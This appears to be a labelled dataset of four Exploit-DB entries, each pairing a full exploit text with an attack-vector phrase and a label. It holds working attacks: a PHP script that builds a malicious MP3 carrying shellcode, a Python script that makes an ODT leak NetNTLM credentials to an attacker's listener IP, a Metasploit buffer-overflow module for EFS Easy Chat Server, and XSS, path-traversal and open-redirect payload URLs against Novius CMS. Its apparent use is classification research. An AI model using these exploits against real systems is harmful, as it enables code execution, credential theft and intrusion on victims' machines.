8780,"COWON America jetCast 2.0.4.1109 - '.mp3' Local Overflow <?php         /*         COWON America jetCast 2.0.4.1109 (.mp3) local heap buffer overlow exploit (xp/sp3)         by Nine:Situations:Group::pyrokinesis                   site: http://retrogod.altervista.org/         software site: http://www.jetaudio.com/         Tested against JetAudio pack v.7.5.2         ---------------------------------------------------------------------------------         Passing an overlong string as id3 tag we have:                   (370.7a8): Access violation - code c0000005 (first chance)         First chance exceptions are reported before any exception handling.         This exception may be expected and handled.         eax=41414141 ebx=00000394 ecx=41414141 edx=00160608 esi=010c1a00 edi=0302fbc8         eip=00486db7 esp=0302fb14 ebp=0302fe7c iopl=0         nv up ei pl nz ac po nc         cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212         jetCast+0x86db7:         00486db7 8b11            mov     edx,dword ptr [ecx]  ds:0023:41414141=????????                   code:         00486DB7  |. 8B11           MOV EDX,DWORD PTR DS:[ECX] <-------crash         00486DB9  |. 8B8D ACFCFFFF  MOV ECX,DWORD PTR SS:[EBP-354]         00486DBF  |. FF52 0C        CALL DWORD PTR DS:[EDX+C]         ...         -------------------------------------------------------------------------------------         We have 4 bytes of ecx to redirect the program to edi, which keeps our buffer.         To do that first we set ecx to a portion of memory which *always* (or nearly) keeps         the filename.         Look 0x01050000... no null char allowed, so I will use 0x01050101 to hit the right         offset.                   To build it we need an address which points to a known call edi, compatible with         windows filenames. To achieve that you may do so:         x@pyro ~/framework-2.2/tools         $ memdump (pid) jetcast         x@pyro ~/framework-2.2/tools         $ cd ..         x@pyro ~/framework-2.2/         $ msfpescan -d ./tools/jetcast/ -j edi         0x7d03388b call edi         ...         x@pyro ~/framework-2.2/tools         $ msfpescan -d ./tools/jetcast/ -x ""\x8b\x38\x03\x7d""         0x028997c4   8b38037d         0x77e062f5   8b38037d         ...         then subtract c. Repeat this for each call edi, took me some time to find every         combination by a script and I finally found a good one in the MSVCRT.DLL given         with the program; a third match seems not possible.         Note: first bytes of EDI keep some null chars, but as you can see, this         portion is nop-equivalent:         0348FBC8   0000             ADD BYTE PTR DS:[EAX],AL         0348FBCA   0000             ADD BYTE PTR DS:[EAX],AL         0348FBCC   0000             ADD BYTE PTR DS:[EAX],AL         0348FBCE   0000             ADD BYTE PTR DS:[EAX],AL         0348FBD0   90               NOP         0348FBD1   90               NOP         0348FBD2   90               NOP         ...                   Usage: php 9sg_jetcast_poc.php         It creates 4 files on your desktop, it says which will hit the right offset on         your system (file path is important to achieve arbitrary code execution on a victim user         so an attacker should persuade him to try to stream them ...)         It works by dragging the file on it or by right clicking and selecting ""Add files ..."",         not 100% reliable, version specific...         -------------------------------------------------------------------------------------         */                   error_reporting(0);         if (php_sapi_name() <> ""cli"")         {                 die(""[!] Launch from the cli!"");         }                   $____scode = ""\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x59\x53"". ""\xbb\x0d\x25\x86\x7c"". //WinExec, 0x7c86250d         ""\xff\xd3\x31\xc0\x50"". ""\xbb\x12\xcb\x81\x7c"". //ExitProcess, 0x7c81cb12         ""\xff\xd3\xe8\xe0\xff\xff\xff\x63\x6d\x64\x2e\x65"". ""\x78\x65\x20\x2f\x63\x20"". ""cmd /c calc && "". ""\xff"";                   if (strlen($____scode) > 118)         {                 die(""[!] Shellcode too large here!"");         }         $____BOOM = ""\x49\x44\x33\x03\x00\x00\x00\x00\x07\x7b\x54\x49\x54\x32\x00\x00\x03\xbe\x00\x00\x00"". str_repeat(""\x90"", 0x7c).//nop, very reusable         ""\xeb\x06\x90\x90"". //jmp short                   //""\x01\x01\x06\x01"". //less usually in this location...         ""\x01\x01\x05\x01"". //eax - ecx, this works 80% of the times         ""\x90\x90\x90\x90"". //nop         $____scode. str_repeat(""A"", 0x01f0 - strlen($____scode)). ""\x54\x41\x4c\x42\x00\x00\x00\x02\x00\x00\x00\x31\x54\x59\x45\x52\x00\x00\x00\x05\x00\x00\x00\x31\x39\x35\x30\x54\x43\x4f"". ""\x4e\x00\x00\x00\x02\x00\x00\x00\x31\x54\x43\x4f\x50\x00\x00\x00\x02\x00\x00\x00\x31\xff\xfb\x90\x64\x00\x00\x00\x00\x00\x00\x00"". ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x49\x6e\x66\x6f\x00\x00\x00"". ""\x0f\x00\x00\x04\x7e\x00\x07\x57\x2e\x00\x02\x05\x08\x0a\x0d\x10\x12\x14\x17\x19\x1c\x1f\x21\x24\x27\x28\x2b\x2e\x30\x33\x36\x38"". ""\x3b\x3d\x40\x42\x45\x48\x4a\x4d\x4f\x51\x54\x57\x59\x5c\x5f\x61\x63\x66\x69\x6b\x6e\x71\x73\x76\x78\x7a\x7d\x80\x82\x85\x88\x8a"". ""\x8c\x8f\x92\x94\x97\x9a\x9c\x9e\xa1\xa3\xa6\xa9\xab\xae\xb1\xb2\xb5\xb8\xba\xbd\xc0\xc3\xc4\xc7\xca\xcc\xcf\xd2\xd4\xd7\xd9\xdb"". ""\xde\xe1\xe3\xe6\xe9\xeb\xed\xf0\xf3\xf5\xf8\xfb\xfd\x00\x00\x00\x37\x4c\x41\x4d\x45\x33\x2e\x39\x38\x20\x01\xaa\x00\x00\x00\x00"". ""\x00\x00\x00\x00\x14\x80\x24\x04\xc7\x4e\x00\x00\x80\x00\x07\x57\x2e\x4f\x7b\xf5\x99\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfb\x90\x64\x00\x09\xf3\x50\x68\xbc"". ""\xb0\x42\x83\x72\x00\x00\x0d\x20\x00\x00\x01\x14\x35\xa8\xf0\x04\x3e\x8d\xc8\x00\x00\x34\x80\x00\x00\x04\x00\x20\xc0\x01\xf2\x67"". ""\x21\x27\x0e\x60\x05\x16\x77\x3c\x84\x69\xc8\xdf\xff\xff\xf3\x9d\xe4\x21\x18\xe0\x00\x04\x65\xa6\x9a\x74\xcb\xe5\xf2\x7d\x22\x18"". ""\x18\xd0\x58\x43\x15\x8a\x50\xd4\x73\xc9\xf2\xfb\xa0\x82\x09\xbd\x48\x20\x85\x68\x20\x85\x34\xd3\xa9\x37\x41\x66\xea\x41\xbf\xab"". ""\x41\x04\x2b\x4d\x37\xa6\x9b\xd0\x41\x0d\x06\xff\xff\xff\xad\x34\xd2\x20\x06\xa4\xd9\xbb\xad\x34\xd3\xd0\x41\xaa\x41\xb5\xff\xd3"". ""\x48\xdd\x46\x0f\xf6\x8b\xd4\x95\x75\x15\x24\x60\x4c\x3f\xc8\x95\x53\x6c\x09\x23\x5b\x55\xae\xbd\x73\xaf\xbc\x7c\xfd\xeb\x3f\x5f"". ""\x74\x92\x29\x7f\x2e\x71\xa2\x67\x78\xc7\xdd\xbd\xeb\x5a\xef\x35\x7a\x8b\x4b\xc4\xd1\x74\xd5\x44\x08\x59\xc2\x52\x10\x18\x03\x65"". ""\x80\xe2\x81\x85\x43\xb2\x5d\x26\x88\xb1\x16\x27\x92\x5a\x46\xc6\x49\x3d\x13\x13\x54\x98\xc4\xc4\xd5\x92\x32\x76\x3e\x4d\x0b\x34"". ""\x6b\x1b\xa6\x79\x16\x5d\x9d\x2a\xd1\x4a\x89\x89\xab\x24\x64\x93\x4c\x8c\x9d\xcf\x14\x46\x5c\x64\x0e\xb9\xe5\xba\xb7\xd7\xba\xaa"". ""\xba\x96\xb6\xa4\x75\x48\x13\xc1\xf1\x05\x04\x97\x12\x27\x8c\x51\x64\x8b\xc9\x3d\x13\x24\x9d\x91\x47\x75\xd4\xee\xc8\xb9\x18\x62"". ""\x28\xe5\xa2\xeb\xca\xb2\x7b\x9b\xcb\x17\x77\x57\x84\x20\x04\x09\x49\x4a\x87\xb2\x30\x2b\x22\x52\x9f\x1a\xa7\xfa\xce\xfd\xef\x47"". ""\x94\xa3\xc8\x90\x1e\x66\x25\x91\xa3\xd4\xe2\xc7\x1f\x3b\x7f\x1e\xf7\xbc\x37\xef\xe3\xd3\x3e\x9a\x65\xf3\x76\x93\x65\xf2\xf8\xe5"". ""\x86\x47\x04\xf2\x81\xb6\x00\x16\x6c\x65\x4a\xef\x74\x10\x41\x37\x6a\x08\x20\x60\x68\x99\x9a\x69\x9b\xbd\x35\x1c\x27\x0c\x48\x99"". ""\x38\x4e\x13\x64\xfb\xa1\x98\x17\x10\x41\x74\xd3\x4d\x34\x19\x6b\x2f\x9a\x54\x82\x88\xa1\x38\xff\xfb\x92\x64\x38\x8d\xf5\x62\x6a"". ""\xbb\x81\x0f\xa3\x72\x00\x00\x0d\x20\x00\x00\x01\x0e\x71\x6a\xf2\x21\x8e\x0d\xc8\x00\x00\x34\x80\x00\x00\x04\x66\x1d\x51\x49\x92"". ""\x44\x50\xd0\xc0\xd1\x03\x03\x43\x74\xd3\xad\xf5\x3a\xb4\x18\xc0\xb8\x79\x33\x33\x83\x5c\x2c\x18\x2c\x64\xb8\xb2\xf9\x99\x7d\x34"". ""\xd4\x87\x41\x69\xd4\x60\x68\xd4\xd6\x66\x6f\x98\x11\x03\xa2\xe5\x36\x4c\xa0\x79\x34\xe5\xdd\xaa\xfb\x36\xca\x14\x04\x04\x04\x98"";         $____x = 0x35;         $____v = (strlen($_SERVER[""USERPROFILE""]) % 4);         $____x = $____x - $____v;         //addresses that worked for me...         //$____pad = str_repeat(""\x73\xb2\x42\x77"",$____x); //0x7742b27f COMCTL32.DLL->0x10003dcc call edi, JetCFG.dll         //$____pad = str_repeat(""\xe9\x62\xe0\x77"",$____x); //0x77e062f5 RPCRT4.DLL->0x7d03388b call edi, SHELL32.DLL         //$____pad = str_repeat(""\x23\xa2\xae\x76"",$____x); //0x76aea22f ATL.DLL->0x10003dcc call edi, JetCFG.dll         $____pad = str_repeat(""\xf3\xa5\xc0\x77"", $____x); //0x77c0a5ff MSVCRT.DLL->0x10003dcc call edi, JetCFG.dll, best one         for ($i = 0; $i < 4; $i++)         {                 $____junk = str_repeat(""_"", $i);                 $____fname = ""_9sg__mzk_"".$____junk.$____pad."".MP3"";                 $____path = $_SERVER[""USERPROFILE""].""\\Desktop\\"".$____fname;                 $____x = fopen($____path, ""w+"");                 if (!$____x)                 {                         die(""[!] Unable to create "".$____path."" ..."");                 }                 fputs ($____x, $____BOOM);                 fclose($____x);                 print(""[*] "".$____path."" created!\n"");                 if ($i == $____v)                         {                         print(""[?] This will hit the right offset on your system! Do you like my composition?\n"");                 }         } ?>  # milw0rm.com [2009-05-26]",a specially crafted .mp3 file,1
44564,"LibreOffice/Open Office - '.odt' Information Disclosure #! /usr/bin/python  # Exploit Title: Malicious ODF File Creator # Date: 1st May 2018 # Exploit Author: Richard Davy # Vendor Homepage: https://www.libreoffice.org/ # Software Link: https://www.libreoffice.org/ # Version: LibreOffice 6.0.3, OpenOffice 4.1.5 # Tested on: Windows 10 #  #Quick script/POC code to create a malicious ODF which can be used to leak NetNTLM credentials  #Usage - Setup responder or similar create a malicious file and point to listener. #Works against LibreOffice 6.03 and OpenOffice 4.1.5 #  #   try: 	from ezodf import newdoc except ImportError: 	print ('ezodf appears to be missing - try: pip install ezodf') 	exit(1)  import os import zipfile import base64  print """"""     ____            __      ____  ____  ______    / __ )____ _____/ /     / __ \/ __ \/ ____/   / __  / __ `/ __  /_____/ / / / / / / /_      / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/     /_____/\__,_/\__,_/      \____/_____/_/       """""" print ""Create a malicious ODF document help leak NetNTLM Creds"" print ""\nBy Richard Davy "" print ""@rd_pentest"" print ""www.secureyourit.co.uk\n""  #Create a blank ODT file namef = ""temp.odt"" odt = newdoc(doctype='odt', filename=namef) odt.save()  #Create our modified content.xml file contentxml1=""PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxvZmZpY2U6ZG9jdW1lbnQtY29udGVudCB4bWxuczpvZmZpY2U9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2ZmaWNlOjEuMCIgeG1sbnM6c3R5bGU9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6c3R5bGU6MS4wIiB4bWxuczp0ZXh0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnRleHQ6MS4wIiB4bWxuczp0YWJsZT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczp0YWJsZToxLjAiIHhtbG5zOmRyYXc9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6ZHJhd2luZzoxLjAiIHhtbG5zOmZvPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnhzbC1mby1jb21wYXRpYmxlOjEuMCIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6bWV0YT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczptZXRhOjEuMCIgeG1sbnM6bnVtYmVyPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmRhdGFzdHlsZToxLjAiIHhtbG5zOnN2Zz0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpzdmctY29tcGF0aWJsZToxLjAiIHhtbG5zOmNoYXJ0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmNoYXJ0OjEuMCIgeG1sbnM6ZHIzZD0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpkcjNkOjEuMCIgeG1sbnM6bWF0aD0iaHR0cDovL3d3dy53My5vcmcvMTk5OC9NYXRoL01hdGhNTCIgeG1sbnM6Zm9ybT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpmb3JtOjEuMCIgeG1sbnM6c2NyaXB0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnNjcmlwdDoxLjAiIHhtbG5zOm9vbz0iaHR0cDovL29wZW5vZmZpY2Uub3JnLzIwMDQvb2ZmaWNlIiB4bWxuczpvb293PSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAwNC93cml0ZXIiIHhtbG5zOm9vb2M9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA0L2NhbGMiIHhtbG5zOmRvbT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS94bWwtZXZlbnRzIiB4bWxuczp4Zm9ybXM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDIveGZvcm1zIiB4bWxuczp4c2Q9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4bWxuczpycHQ9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA1L3JlcG9ydCIgeG1sbnM6b2Y9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2Y6MS4yIiB4bWxuczp4aHRtbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgeG1sbnM6Z3JkZGw9Imh0dHA6Ly93d3cudzMub3JnLzIwMDMvZy9kYXRhLXZpZXcjIiB4bWxuczpvZmZpY2Vvb289Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA5L29mZmljZSIgeG1sbnM6dGFibGVvb289Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA5L3RhYmxlIiB4bWxuczpkcmF3b29vPSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAxMC9kcmF3IiB4bWxuczpjYWxjZXh0PSJ1cm46b3JnOmRvY3VtZW50Zm91bmRhdGlvbjpuYW1lczpleHBlcmltZW50YWw6Y2FsYzp4bWxuczpjYWxjZXh0OjEuMCIgeG1sbnM6bG9leHQ9InVybjpvcmc6ZG9jdW1lbnRmb3VuZGF0aW9uOm5hbWVzOmV4cGVyaW1lbnRhbDpvZmZpY2U6eG1sbnM6bG9leHQ6MS4wIiB4bWxuczpmaWVsZD0idXJuOm9wZW5vZmZpY2U6bmFtZXM6ZXhwZXJpbWVudGFsOm9vby1tcy1pbnRlcm9wOnhtbG5zOmZpZWxkOjEuMCIgeG1sbnM6Zm9ybXg9InVybjpvcGVub2ZmaWNlOm5hbWVzOmV4cGVyaW1lbnRhbDpvb3htbC1vZGYtaW50ZXJvcDp4bWxuczpmb3JtOjEuMCIgeG1sbnM6Y3NzM3Q9Imh0dHA6Ly93d3cudzMub3JnL1RSL2NzczMtdGV4dC8iIG9mZmljZTp2ZXJzaW9uPSIxLjIiPjxvZmZpY2U6c2NyaXB0cy8+PG9mZmljZTpmb250LWZhY2UtZGVjbHM+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMdWNpZGEgU2FuczEiIHN2Zzpmb250LWZhbWlseT0iJmFwb3M7THVjaWRhIFNhbnMmYXBvczsiIHN0eWxlOmZvbnQtZmFtaWx5LWdlbmVyaWM9InN3aXNzIi8+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMaWJlcmF0aW9uIFNlcmlmIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO0xpYmVyYXRpb24gU2VyaWYmYXBvczsiIHN0eWxlOmZvbnQtZmFtaWx5LWdlbmVyaWM9InJvbWFuIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iTGliZXJhdGlvbiBTYW5zIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO0xpYmVyYXRpb24gU2FucyZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3dpc3MiIHN0eWxlOmZvbnQtcGl0Y2g9InZhcmlhYmxlIi8+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMdWNpZGEgU2FucyIgc3ZnOmZvbnQtZmFtaWx5PSImYXBvcztMdWNpZGEgU2FucyZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iTWljcm9zb2Z0IFlhSGVpIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO01pY3Jvc29mdCBZYUhlaSZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iU2ltU3VuIiBzdmc6Zm9udC1mYW1pbHk9IlNpbVN1biIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjwvb2ZmaWNlOmZvbnQtZmFjZS1kZWNscz48b2ZmaWNlOmF1dG9tYXRpYy1zdHlsZXM+PHN0eWxlOnN0eWxlIHN0eWxlOm5hbWU9ImZyMSIgc3R5bGU6ZmFtaWx5PSJncmFwaGljIiBzdHlsZTpwYXJlbnQtc3R5bGUtbmFtZT0iT0xFIj48c3R5bGU6Z3JhcGhpYy1wcm9wZXJ0aWVzIHN0eWxlOmhvcml6b250YWwtcG9zPSJjZW50ZXIiIHN0eWxlOmhvcml6b250YWwtcmVsPSJwYXJhZ3JhcGgiIGRyYXc6b2xlLWRyYXctYXNwZWN0PSIxIi8+PC9zdHlsZTpzdHlsZT48L29mZmljZTphdXRvbWF0aWMtc3R5bGVzPjxvZmZpY2U6Ym9keT48b2ZmaWNlOnRleHQ+PHRleHQ6c2VxdWVuY2UtZGVjbHM+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJJbGx1c3RyYXRpb24iLz48dGV4dDpzZXF1ZW5jZS1kZWNsIHRleHQ6ZGlzcGxheS1vdXRsaW5lLWxldmVsPSIwIiB0ZXh0Om5hbWU9IlRhYmxlIi8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJUZXh0Ii8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJEcmF3aW5nIi8+PC90ZXh0OnNlcXVlbmNlLWRlY2xzPjx0ZXh0OnAgdGV4dDpzdHlsZS1uYW1lPSJTdGFuZGFyZCIvPjx0ZXh0OnAgdGV4dDpzdHlsZS1uYW1lPSJTdGFuZGFyZCI+PGRyYXc6ZnJhbWUgZHJhdzpzdHlsZS1uYW1lPSJmcjEiIGRyYXc6bmFtZT0iT2JqZWN0MSIgdGV4dDphbmNob3ItdHlwZT0icGFyYWdyYXBoIiBzdmc6d2lkdGg9IjE0LjEwMWNtIiBzdmc6aGVpZ2h0PSI5Ljk5OWNtIiBkcmF3OnotaW5kZXg9IjAiPjxkcmF3Om9iamVjdCB4bGluazpocmVmPSJmaWxlOi8v"" contentxml2=raw_input(""\nPlease enter IP of listener: "") contentxml3=""L3Rlc3QuanBnIiB4bGluazp0eXBlPSJzaW1wbGUiIHhsaW5rOnNob3c9ImVtYmVkIiB4bGluazphY3R1YXRlPSJvbkxvYWQiLz48ZHJhdzppbWFnZSB4bGluazpocmVmPSIuL09iamVjdFJlcGxhY2VtZW50cy9PYmplY3QgMSIgeGxpbms6dHlwZT0ic2ltcGxlIiB4bGluazpzaG93PSJlbWJlZCIgeGxpbms6YWN0dWF0ZT0ib25Mb2FkIi8+PC9kcmF3OmZyYW1lPjwvdGV4dDpwPjwvb2ZmaWNlOnRleHQ+PC9vZmZpY2U6Ym9keT48L29mZmljZTpkb2N1bWVudC1jb250ZW50Pg==""  fileout=base64.b64decode(contentxml1)+contentxml2+base64.b64decode(contentxml3)  text_file = open(""content.xml"", ""w"") text_file.write(fileout) text_file.close()  #Create a copy of the blank odt file without the content.xml file in (odt files are basically a zip) zin = zipfile.ZipFile ('temp.odt', 'r') zout = zipfile.ZipFile ('bad.odt', 'w') for item in zin.infolist():     buffer = zin.read(item.filename)     if (item.filename != 'content.xml'):         zout.writestr(item, buffer) zout.close() zin.close()  #Add our modified content.xml file to our odt file zf = zipfile.ZipFile('bad.odt', mode='a') try: 	zf.write('content.xml', arcname='content.xml') finally: 	zf.close()  #Clean up temp files os.remove(""content.xml"") os.remove(""temp.odt"")",a specially crafted .odt file,1
11210,"EFS Easy Chat Server - Universal Buffer Overflow (SEH) (Metasploit) ## # $Id: ca_igateway_debug.rb 6568 2009-05-19 13:20:32Z hdm $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##    class Metasploit3 < Msf::Exploit::Remote  	include Msf::Exploit::Remote::Tcp 	include Msf::Exploit::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'EFS Easy Chat server Universal BOF-SEH (META)', 			'Description'    => %q{ 				This module exploits a vulnerability in Easy chat server by passing 				an arbitary evil biuffer along with the username password. 				Sucessful attack could run arbitary code on victim machine 			}, 			'Author'         => 'FB1H2S', 			'License'        => MSF_LICENSE, 			'Version'        => '', 			'References'     => 				[ 					[ 'Exploitdb', 'http://www.exploit-db.com/exploits/11179' ], 					 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'seh', 				}, 			'Payload'        => 				{ 					'Space'    => 1200, 					'BadChars' => ""\x00\x0a\x0d\x20"", 					'StackAdjustment' => -3500, 					'Compat'   =>  					{ 						'ConnectionType' => '+ws2ord', 					}, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'EFS Easy Chat Server Universal', { 'Ret' => 0x1001b9a2 } ], # p/p/r  				], 			'Privileged'     => true, 			'DisclosureDate' => 'jan 2010', 			'DefaultTarget'  => 0))  		register_options( 			[ 				Opt::RPORT(80), 			], self.class) 	end  		  		def exploit 			connect 			sploit = Rex::Text.rand_text_alphanumeric(216) 		        sploit << ""\xeb\x06\x90\x90""            # short jump 6 bytes 			sploit << [target.ret].pack('V')      #ppr universal 			sploit << ""\x90"" * 20                # nop sled 			sploit << payload.encoded            #payload \xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc 			sploit << ""\x90"" * 20 			request= 'chat.ghp?username=' +sploit+ '&password=' +sploit+ '&room=1&sex=2' 			send = ""GET /"" + request + "" HTTP/1.0"" 			sock.put(send + ""\r\n\r\n\r\n"") 			disconnect 			handler 		end 	end",passing an arbitary evil biuffer along with the username password,1
37439,"Novius 5.0.1 - Multiple Vulnerabilities [+] Credits: John Page ( hyp3rlinx )  [+] Domains: hyp3rlinx.altervista.org  [+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-NOVIUSOS0629.txt    Vendor: ======================= community.novius-os.org   Product: =============================================================== novius-os.5.0.1-elche is a  PHP Based Content Management System community.novius-os.org/developpers/download.html    Advisory Information: =================================== Persistent XSS, LFI & Open Redirect    Vulnerability Details: ======================  Persistent XSS: --------------- Users can inject XSS payloads that will be saved to MySQL DB, where they will execute each time when accessed.  1- In Admin under 'Media Center' users can inject XSS payloads and save to the 'media_title' field for a saved media file,    create a new media page inject payload click save and then select visualize.  2- Under Website menus area users can inject XSS payloads and save for the 'menu_title' field for a Website menu.  If we view browser source code at http://localhost/novius-os.5.0.1-elche/novius-os/?_preview the XSS is output to its HTML entities.  e.g. <title><script>alert('HELL')</script></title>  But within the same webpage for <h1> tag you can see it is not.  e.g. <div id=""block-grid"" class="" customisable col-md-12 col-sm-12 col-xs-12 main_wysiwyg""><h1 id=""pagename""><script>alert('HELL')</script></h1>   Local File Inclusion: --------------------- We can directory traverse access and read files outside of the current working directory in the Admin area by abusing the 'tab' parameter. http://localhost/novius-os.5.0.1-elche/novius-os/admin/?tab=../../../../    Open Redirect: -------------- http://localhost/novius-os.5.0.1-elche/novius-os/admin/nos/login?redirect= is open to abuse by supplying an malicious a location or file.    XSS Exploit code(s): ==================== In 'Media Center' create a new media file, click edit and inject XSS payload for the 'title' field click save and then select visualize. http://localhost/novius-os.5.0.1-elche/novius-os/admin/?tab=admin/noviusos_media/media/insert_update/1  vulnerable parameter: media_title  In 'Website Menu' create a new website menu item and inject XSS payload click save and then select visualize. http://localhost/novius-os.5.0.1-elche/novius-os/admin/?tab=admin/noviusos_menu/menu/crud/insert_update%3Fcontext%3Dmain%253A%253Aen_GB http://localhost/novius-os.5.0.1-elche/novius-os/?_preview=1  vulnerable parameter: menu_title    LFI: ---- http://localhost/novius-os.5.0.1-elche/novius-os/admin/?tab=../../../SENSITIVE-FILE.txt  http://localhost/novius-os.5.0.1-elche/novius-os/admin/?tab=../../../../xampp/phpinfo.php    Open Redirect: -------------- http://localhost/novius-os.5.0.1-elche/novius-os/admin/nos/login?redirect=http://www.SATANSBRONZEBABYSHOES.com    Disclosure Timeline: ====================================== Vendor Notification: NA June 29, 2015 : Public Disclosure    Severity Level: ================= Med    Description: ================================================================================  Request Method(s):         [+] GET & POST   Vulnerable Product:        [+] novius-os.5.0.1-elche   Vulnerable Parameter(s):   [+] media_title, menu_title, tab, redirect   Affected Area(s):          [+] Login, Web Pages, Media Center & Website Menu area   =================================================================================  [+] Disclaimer Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.   (hyp3rlinx)","inject XSS payloads and save to the 'media_title' field for a saved media file, create a new media page inject payload",1
